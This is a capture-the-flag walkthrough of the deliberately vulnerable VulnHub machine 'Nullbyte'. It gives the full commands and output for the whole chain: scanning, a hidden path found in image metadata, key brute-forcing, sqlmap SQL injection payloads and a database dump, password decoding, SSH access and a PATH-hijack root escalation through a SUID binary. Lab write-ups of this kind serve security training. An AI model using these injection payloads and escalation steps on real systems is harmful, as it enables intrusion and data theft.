Nullbyte

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
[+] Content Discovery
[+] Stegano - exiftool - URL in image
[+] Bruteforcing key with burp and automation curl
[+] SQLmap exploitation - dumping database
[+] MD5 Craking online
[+] Prvilege Escalation abusing PATH Variables - ps
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Nmap Scan Results

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Nmap scan report for 192.168.56.107
Host is up (0.00073s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE VERSION
80/tcp  open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Null Byte 00 - level 1
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100024  1          46959/tcp  status
|_  100024  1          51878/udp  status
777/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   1024 16:30:13:d9:d5:55:36:e8:1b:b7:d9:ba:55:2f:d7:44 (DSA)
|   2048 29:aa:7d:2e:60:8b:a6:a1:c2:bd:7c:c8:bd:3c:f4:f2 (RSA)
|   256 60:06:e3:64:8f:8a:6f:a7:74:5a:8b:3f:e1:24:93:96 (ECDSA)
|_  256 bc:f7:44:8d:79:6a:19:48:76:a3:e2:44:92:dc:13:a2 (ED25519)
MAC Address: 08:00:27:FE:89:AF (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.73 ms 192.168.56.107

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.36 seconds

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Dirb Results

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# dirb http://192.168.56.107

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Thu Nov 28 09:25:41 2019
URL_BASE: http://192.168.56.107/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.56.107/ ----
+ http://192.168.56.107/index.html (CODE:200|SIZE:196)                         
==> DIRECTORY: http://192.168.56.107/javascript/                               
==> DIRECTORY: http://192.168.56.107/phpmyadmin/                               
+ http://192.168.56.107/server-status (CODE:403|SIZE:302)                      
==> DIRECTORY: http://192.168.56.107/uploads/                                  
                                                                               
---- Entering directory: http://192.168.56.107/javascript/ ----
==> DIRECTORY: http://192.168.56.107/javascript/jquery/                        
                                                                               
---- Entering directory: http://192.168.56.107/phpmyadmin/ ----
==> DIRECTORY: http://192.168.56.107/phpmyadmin/docs/                          
+ http://192.168.56.107/phpmyadmin/favicon.ico (CODE:200|SIZE:18902)           
+ http://192.168.56.107/phpmyadmin/index.php (CODE:200|SIZE:9116)              
==> DIRECTORY: http://192.168.56.107/phpmyadmin/js/                            
+ http://192.168.56.107/phpmyadmin/libraries (CODE:403|SIZE:309)               
==> DIRECTORY: http://192.168.56.107/phpmyadmin/locale/                        
+ http://192.168.56.107/phpmyadmin/phpinfo.php (CODE:200|SIZE:9118)            
+ http://192.168.56.107/phpmyadmin/setup (CODE:401|SIZE:461)                   
==> DIRECTORY: http://192.168.56.107/phpmyadmin/themes/   
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


From the main.jpg using exiftools we get the following Comment :    kzMb5nVYJw

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# wget http://192.168.56.107/main.gif
--2019-11-28 09:29:15--  http://192.168.56.107/main.gif
Connecting to 192.168.56.107:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 16647 (16K) [image/gif]
Saving to: ‘main.gif’

main.gif            100%[===================>]  16.26K  --.-KB/s    in 0.001s  

2019-11-28 09:29:15 (24.6 MB/s) - ‘main.gif’ saved [16647/16647]
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


We get to the file:http://192.168.56.107/kzMb5nVYJw/index.php

![Alt Tag](https://raw.githubusercontent.com/setrus/VulnHub/master/Nullbyte/nullbyte1.png)

After entering keys from rockyou.txt we found the key : elite

![Alt Tag](https://raw.githubusercontent.com/setrus/VulnHub/master/Nullbyte/nullbyte2.png)

We have to enter a username 

Using SQLmap to get the database name : seth

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
sqlmap -u http://192.168.56.107/kzMb5nVYJw/420search.php?usrtosearch=1 --batch --dbs
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# sqlmap -u http://192.168.56.107/kzMb5nVYJw/420search.php?usrtosearch=1 --batch --dbs
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.3#stable}
|_ -| . [(]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 09:56:15 /2019-11-28/

[09:56:16] [INFO] resuming back-end DBMS 'mysql' 
[09:56:16] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: usrtosearch (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: usrtosearch=1" OR NOT 3102=3102#

    Type: error-based
    Title: MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)
    Payload: usrtosearch=1" AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b6b7671,(SELECT (ELT(8275=8275,1))),0x7176716271,0x78))s), 8446744073709551610, 8446744073709551610)))-- DMqR

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 OR time-based blind
    Payload: usrtosearch=1" OR SLEEP(5)-- qpbe

    Type: UNION query
    Title: MySQL UNION query (NULL) - 3 columns
    Payload: usrtosearch=1" UNION ALL SELECT CONCAT(0x716b6b7671,0x67777a7870565a7a51464551424651525746667964654a486a554d4e79615562475a44565a636d75,0x7176716271),NULL,NULL#
---
[09:56:16] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 8.0 (jessie)
web application technology: Apache 2.4.10
back-end DBMS: MySQL >= 5.5
[09:56:16] [INFO] fetching database names
available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] phpmyadmin
[*] seth

[09:56:16] [INFO] fetched data logged to text files under '/root/.sqlmap/output/192.168.56.107'

[*] ending @ 09:56:16 /2019-11-28/
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Dumb Database

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# sqlmap -u http://192.168.56.107/kzMb5nVYJw/420search.php?usrtosearch=1 --batch --dump-all -D seth
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# sqlmap -u http://192.168.56.107/kzMb5nVYJw/420search.php?usrtosearch=1 --batch --dump-all -D seth
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.3#stable}
|_ -| . [(]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 09:58:31 /2019-11-28/

[09:58:31] [INFO] resuming back-end DBMS 'mysql' 
[09:58:31] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: usrtosearch (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: usrtosearch=1" OR NOT 3102=3102#

    Type: error-based
    Title: MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)
    Payload: usrtosearch=1" AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b6b7671,(SELECT (ELT(8275=8275,1))),0x7176716271,0x78))s), 8446744073709551610, 8446744073709551610)))-- DMqR

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 OR time-based blind
    Payload: usrtosearch=1" OR SLEEP(5)-- qpbe

    Type: UNION query
    Title: MySQL UNION query (NULL) - 3 columns
    Payload: usrtosearch=1" UNION ALL SELECT CONCAT(0x716b6b7671,0x67777a7870565a7a51464551424651525746667964654a486a554d4e79615562475a44565a636d75,0x7176716271),NULL,NULL#
---
[09:58:31] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 8.0 (jessie)
web application technology: Apache 2.4.10
back-end DBMS: MySQL >= 5.5
[09:58:31] [INFO] fetching tables for database: 'seth'
[09:58:31] [INFO] fetching columns for table 'users' in database 'seth'
[09:58:31] [INFO] fetching entries for table 'users' in database 'seth'
Database: seth
Table: users
[2 entries]
+----+---------------------------------------------+--------+------------+
| id | pass                                        | user   | position   |
+----+---------------------------------------------+--------+------------+
| 1  | YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE | ramses | <blank>    |
| 2  | --not allowed--                             | isis   | employee   |
+----+---------------------------------------------+--------+------------+

[09:58:31] [INFO] table 'seth.users' dumped to CSV file '/root/.sqlmap/output/192.168.56.107/dump/seth/users.csv'
[09:58:31] [INFO] fetched data logged to text files under '/root/.sqlmap/output/192.168.56.107'

[*] ending @ 09:58:31 /2019-11-28/

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


usernames: ramses, isis

password : YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# echo 'YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE=' | base64 -d
c6d6bd7ebf806f43c76acc3681703b81
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![Alt Tag](https://raw.githubusercontent.com/setrus/VulnHub/master/Nullbyte/nullbyte3.png)



Username: ramses

Password: omega


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# ssh ramses@192.168.56.107 -p777
ramses@192.168.56.107's password: 

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Nov 29 01:07:30 2019 from 192.168.56.101
ramses@NullByte:~$ id
uid=1002(ramses) gid=1002(ramses) groups=1002(ramses)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



Privilege Escalation. 

Looking for SUID bit files

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ramses@NullByte:~$ find / -perm -u=s -type f 2>/dev/null

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ramses@NullByte:~$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/pt_chown
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/procmail
/usr/bin/at
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/sudo
/usr/sbin/exim4
/var/www/backup/procwatch
/bin/su
/bin/mount
/bin/umount
/sbin/mount.nfs
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

The program /var/www/backup/procwatch  is trying to run ps

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ramses@NullByte:~$ /var/www/backup/procwatch
  PID TTY          TIME CMD
 1449 pts/0    00:00:00 procwatch
 1450 pts/0    00:00:00 sh
 1451 pts/0    00:00:00 ps



~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Privilege Escalation

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ramses@NullByte:~$ echo '/bin/sh' > /tmp/ps; chmod 777 /tmp/ps; export PATH=/tmp:$PATH; /var/www/backup/procwatch
# id
uid=1002(ramses) gid=1002(ramses) euid=0(root) groups=1002(ramses)
# ls /root;
proof.txt
# cat /root/proof.txt
adf11c7a9e6523e630aaf3b9b7acb51d

It seems that you have pwned the box, congrats. 
Now you done that I wanna talk with you. Write a walk & mail at
xly0n@sigaint.org attach the walk and proof.txt
If sigaint.org is down you may mail at nbsly0n@gmail.com


USE THIS PGP PUBLIC KEY

-----BEGIN PGP PUBLIC KEY BLOCK-----
Version: BCPG C# v1.6.1.0

mQENBFW9BX8BCACVNFJtV4KeFa/TgJZgNefJQ+fD1+LNEGnv5rw3uSV+jWigpxrJ
Q3tO375S1KRrYxhHjEh0HKwTBCIopIcRFFRy1Qg9uW7cxYnTlDTp9QERuQ7hQOFT
e4QU3gZPd/VibPhzbJC/pdbDpuxqU8iKxqQr0VmTX6wIGwN8GlrnKr1/xhSRTprq
Cu7OyNC8+HKu/NpJ7j8mxDTLrvoD+hD21usssThXgZJ5a31iMWj4i0WUEKFN22KK
+z9pmlOJ5Xfhc2xx+WHtST53Ewk8D+Hjn+mh4s9/pjppdpMFUhr1poXPsI2HTWNe
YcvzcQHwzXj6hvtcXlJj+yzM2iEuRdIJ1r41ABEBAAG0EW5ic2x5MG5AZ21haWwu
Y29tiQEcBBABAgAGBQJVvQV/AAoJENDZ4VE7RHERJVkH/RUeh6qn116Lf5mAScNS
HhWTUulxIllPmnOPxB9/yk0j6fvWE9dDtcS9eFgKCthUQts7OFPhc3ilbYA2Fz7q
m7iAe97aW8pz3AeD6f6MX53Un70B3Z8yJFQbdusbQa1+MI2CCJL44Q/J5654vIGn
XQk6Oc7xWEgxLH+IjNQgh6V+MTce8fOp2SEVPcMZZuz2+XI9nrCV1dfAcwJJyF58
kjxYRRryD57olIyb9GsQgZkvPjHCg5JMdzQqOBoJZFPw/nNCEwQexWrgW7bqL/N8
TM2C0X57+ok7eqj8gUEuX/6FxBtYPpqUIaRT9kdeJPYHsiLJlZcXM0HZrPVvt1HU
Gms=
=PiAQ
-----END PGP PUBLIC KEY BLOCK-----


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

